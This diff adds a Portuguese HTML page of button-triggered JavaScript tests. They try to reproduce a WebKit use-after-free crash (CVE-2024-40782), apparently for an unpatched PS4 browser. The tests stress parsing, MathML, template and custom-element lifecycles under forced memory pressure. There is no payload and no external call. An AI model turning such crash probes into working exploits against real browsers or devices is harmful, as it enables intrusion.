@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>CVE-2024-40782 — Motyl (Immunity) UAF BZ#268770</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030206;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#ff4444;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.src{background:#050508;border:2px solid #882200;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#ff9977;line-height:1.8}
+.src strong{color:#ff6644;display:block;margin-bottom:4px}
+#log{background:#060608;border:1px solid #1a0a0a;border-radius:5px;padding:10px;min-height:200px;white-space:pre;overflow-y:auto;max-height:420px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.w{color:#ffaa00}.e{color:#ff4444}.i{color:#4488ff}.sep{color:#333}
+.btn{display:inline-block;margin-top:10px;margin-right:5px;padding:7px 13px;background:#110000;border:1px solid #440000;border-radius:4px;color:#cc4444;cursor:pointer;font:11px 'Courier New',monospace}
+.btn:hover{border-color:#ff4444;color:#ff6644}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🔴 CVE-2024-40782 — Maksymilian Motyl (Immunity Systems) UAF BZ#268770</h1>
+<p class="meta">Crédito: Maksymilian Motyl of Immunity Systems · Safari 17.6 Jul/2024 · Process crash</p>
+<div class="src">
+<strong>📋 ANÁLISE — BZ#268770 · Immunity Systems</strong>
+CVE: CVE-2024-40782 · Fix: Safari 17.6 (Jul/2024) · Bugzilla: #268770<br>
+Impacto: "Processing maliciously crafted web content may lead to an unexpected process crash"<br>
+Fix: "A use-after-free issue was addressed with improved memory management"<br>
+<br>
+Motyl aparece em múltiplos WebKit advisories: BZ#268770 (UAF) e BZ#268765 (ACE)<br>
+no mesmo período → mesma campanha de pesquisa.<br>
+Immunity Systems é empresa de segurança ofensiva → bugs são em parsing/DOM reais<br>
+<br>
+PADRÃO IMMUNITY: Tende a focar em HTML parser edge cases, XML processing,<br>
+file format parsing dentro do WebKit (SVG, HTML5, MathML).<br>
+BZ#268770 foi reportado antes de BZ#268765 → bug mais fundamental.<br>
+GAP PS4: Set/2023 → Jul/2024 = 10 meses
+</div>
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="t1()">① HTML5 Parser Edge Cases</button>
+  <button class="btn" onclick="t2()">② MathML UAF</button>
+  <button class="btn" onclick="t3()">③ XML/XHTML Parser</button>
+  <button class="btn" onclick="t4()">④ Template Element Lifecycle</button>
+  <button class="btn" onclick="t5()">⑤ Custom Elements + Upgrade</button>
+  <button class="btn" onclick="t6()">⑥ Script Type + Parser</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+t+' ───','sep')}
+function gc(){try{var a=[];for(var i=0;i<15;i++)a.push(new ArrayBuffer(1024*1024*2));a=null}catch(e){}}
+
+function t1(){
+  sep('HTML5 Parser Edge Cases — Immunity Pattern');
+  l('Estruturas HTML malformadas que testam o parser tree construction algorithm...','w');
+  try {
+    var host=document.createElement('div');
+    document.body.appendChild(host);
+    // HTML5 tree construction algorithm edge cases
+    var htmlCases=[
+      // Adoption agency algorithm
+      '<p><b><i>text</p></b></i>',
+      // Quirky nesting
+      '<table><tr><td><p><b></td></tr></table>',
+      // Foster parenting
+      '<table><b><tr><td>text</td></tr></b></table>',
+      // Misnested tags
+      '<div><p><span><p>inner</span></p></div>',
+      // Form inside table (causes foster parenting)
+      '<table><form><tr><td>cell</td></tr></form></table>',
+      // Nested anchors (illegal)
+      '<a href="x"><a href="y">text</a></a>',
+      // Open elements at EOF
+      '<div><p><b><i><u><s><em>unclosed all',
+      // Script in different contexts
+      '<select><script>var x=1;</script></select>',
+      // Weird self-closing
+      '<div/><p>text</p>',
+    ];
+    htmlCases.forEach(function(html, i){
+      try {
+        host.innerHTML=html;
+        host.offsetHeight;
+        var nodes=host.childNodes.length;
+        l('HTML case '+i+': parsed, childCount='+nodes,'ok');
+      } catch(e2){ l('CRASH html['+i+']: '+e2.name,'e'); }
+      host.innerHTML='';
+    });
+    document.body.removeChild(host);
+  } catch(e){ l('CRASH: '+e.name,'e'); }
+}
+
+function t2(){
+  sep('MathML UAF — Immunity Pattern');
+  l('MathML com estruturas complexas e nós removidos durante rendering...','w');
+  try {
+    var ns='http://www.w3.org/1998/Math/MathML';
+    var host=document.createElement('div');
+    document.body.appendChild(host);
+    // Cria estrutura MathML via innerHTML
+    host.innerHTML=[
+      '<math xmlns="http://www.w3.org/1998/Math/MathML">',
+      '<mfrac>',
+      '  <mrow><mi>x</mi><mo>+</mo><mn>1</mn></mrow>',
+      '  <mrow><mi>y</mi><mo>-</mo><mn>2</mn></mrow>',
+      '</mfrac>',
+      '<msup><mi>e</mi><mrow><mo>-</mo><msup><mi>x</mi><mn>2</mn></msup></mrow></msup>',
+      '<munder><mo>&#x2211;</mo><mrow><mi>n</mi><mo>=</mo><mn>0</mn></mrow></munder>',
+      '<mover><mi>a</mi><mo>&#x2192;</mo></mover>',
+      '</math>'
+    ].join('');
+    host.offsetHeight;
+    // Guarda refs e remove nós MathML
+    var mathNodes=host.querySelectorAll('mi, mn, mo, mrow');
+    var refs=Array.from(mathNodes);
+    refs.forEach(function(n,i){
+      if(i%2===0 && n.parentNode) n.parentNode.removeChild(n);
+    });
+    host.offsetHeight; // re-render sem os nós
+    gc();
+    // Acessa propriedades dos nós removidos
+    refs.forEach(function(n){
+      try { var tag=n.tagName; var txt=n.textContent; } catch(e2){}
+    });
+    document.body.removeChild(host);
+    l('MathML UAF: sem crash','ok');
+  } catch(e){ l('CRASH MathML: '+e.name,'e'); }
+}
+
+function t3(){
+  sep('XML/XHTML Parser via DOMParser');
+  l('DOMParser com XML malformado/edge cases...','w');
+  try {
+    var parser=new DOMParser();
+    var cases=[
+      // XHTML válido
+      '<html xmlns="http://www.w3.org/1999/xhtml"><body><p>text</p></body></html>',
+      // XML com namespaces
+      '<root xmlns:a="ns1" xmlns:b="ns2"><a:el b:attr="val">content</a:el></root>',
+      // Processing instructions
+      '<?xml version="1.0"?><?pi target?><root/>',
+      // CDATA
+      '<root><![CDATA[text with <tags> & entities]]></root>',
+      // Deep nesting
+      '<a>'.repeat(100)+'text'+'</a>'.repeat(100),
+      // Many attributes
+      '<el '+Array(50).fill(0).map(function(_,i){ return 'a'+i+'="v'+i+'"'; }).join(' ')+'/>',
+    ];
+    cases.forEach(function(xml, i){
+      try {
+        var doc=parser.parseFromString(xml, 'application/xml');
+        var err=doc.querySelector('parsererror');
+        if(err){ l('XML case '+i+': parse error (ok)','w'); }
+        else { l('XML case '+i+': parsed, root='+doc.documentElement.tagName,'ok'); }
+        // Adopta nós do documento XML para o documento HTML principal
+        var root=doc.documentElement;
+        if(root){
+          var adopted=document.adoptNode(root);
+          document.body.appendChild(adopted);
+          adopted.offsetHeight;
+          document.body.removeChild(adopted);
+        }
+      } catch(e2){ l('CRASH xml['+i+']: '+e2.name,'e'); }
+    });
+    l('XML parser: sem crash','ok');
+  } catch(e){ l('CRASH: '+e.name,'e'); }
+}
+
+function t4(){
+  sep('Template Element + Content Lifecycle');
+  l('HTMLTemplateElement com conteúdo adotado e removido...','w');
+  try {
+    var template=document.createElement('template');
+    template.innerHTML='<div class="tmpl"><p>paragraph</p><span>span</span></div>'.repeat(10);
+    document.body.appendChild(template);
+    // Clona o conteúdo do template
+    var clones=[];
+    for(var i=0;i<20;i++){
+      var clone=document.importNode(template.content, true); // deep clone do DocumentFragment
+      document.body.appendChild(clone);
+      clones.push(clone);
+    }
+    // O template.content ainda existe mas os nós foram importados
+    l('template.content nodes: '+template.content.childNodes.length,'i');
+    gc();
+    // Modifica o template.content após import
+    var origChild=template.content.firstChild;
+    if(origChild) template.content.removeChild(origChild);
+    // Re-acessa os clones que foram importados
+    document.querySelectorAll('.tmpl').forEach(function(el, i){
+      try {
+        var ps=el.querySelectorAll('p');
+        ps.forEach(function(p){ p.textContent='modified-'+i; });
+      } catch(e2){ l('CRASH tmpl clone['+i+']: '+e2.name,'e'); }
+    });
+    // Limpa
+    document.querySelectorAll('.tmpl').forEach(function(el){
+      if(el.parentNode) el.parentNode.removeChild(el);
+    });
+    document.body.removeChild(template);
+    l('Template lifecycle: sem crash','ok');
+  } catch(e){ l('CRASH template: '+e.name,'e'); }
+}
+
+function t5(){
+  sep('Custom Elements + Upgrade Lifecycle');
+  l('Custom elements com upgrades e remoções durante connectedCallback...','w');
+  try {
+    var upgradeCount=0, disconnectCount=0;
+    // Define custom element
+    if(!customElements.get('test-motyl-el')){
+      class TestEl extends HTMLElement {
+        connectedCallback(){
+          upgradeCount++;
+          // Remove a si mesmo dentro do connectedCallback
+          if(upgradeCount%3===0 && this.parentNode){
+            var parent=this.parentNode;
+            parent.removeChild(this);
+            gc();
+          }
+        }
+        disconnectedCallback(){ disconnectCount++; }
+      }
+      customElements.define('test-motyl-el', TestEl);
+    }
+    var host=document.createElement('div');
+    document.body.appendChild(host);
+    // Cria e insere custom elements
+    for(var i=0;i<30;i++){
+      var el=document.createElement('test-motyl-el');
+      el.dataset.idx=i;
+      host.appendChild(el);
+    }
+    setTimeout(function(){
+      if(host.parentNode) document.body.removeChild(host);
+      l('Custom elements: '+upgradeCount+' connects, '+disconnectCount+' disconnects','ok');
+    },200);
+    l('30 custom elements inseridos...','i');
+  } catch(e){ l('CRASH custom elements: '+e.name,'e'); }
+}
+
+function t6(){
+  sep('Script Type + Parser Interaction');
+  l('Scripts com type incomum e parser interaction...','w');
+  try {
+    var types=[
+      'text/javascript',
+      'module',
+      'application/json',
+      'text/plain',
+      'application/ld+json',
+      'importmap',
+      'speculationrules',
+      '', // vazio = javascript
+    ];
+    var host=document.createElement('div');
+    document.body.appendChild(host);
+    types.forEach(function(type, i){
+      try {
+        var s=document.createElement('script');
+        if(type) s.type=type;
+        s.textContent='/* test '+i+' */';
+        host.appendChild(s);
+        host.offsetHeight;
+        // Remove imediatamente após inserção (antes de parsing completo?)
+        if(s.parentNode) host.removeChild(s);
+        l('script type="'+type+'": ok','ok');
+      } catch(e2){ l('CRASH script type='+type+': '+e2.name,'e'); }
+    });
+    document.body.removeChild(host);
+    l('Script types: sem crash','ok');
+  } catch(e){ l('CRASH: '+e.name,'e'); }
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ CVE-2024-40782 — Motyl Immunity Systems UAF (BZ#268770)','w');
+  l('HTML5/XML/MathML parser patterns · Custom elements · Template lifecycle','i');
+  t1(); setTimeout(t2,600); setTimeout(t3,1200); setTimeout(t4,1800);
+  setTimeout(t5,2400); setTimeout(t6,3000);
+}
+</script>
+</body>
+</html>
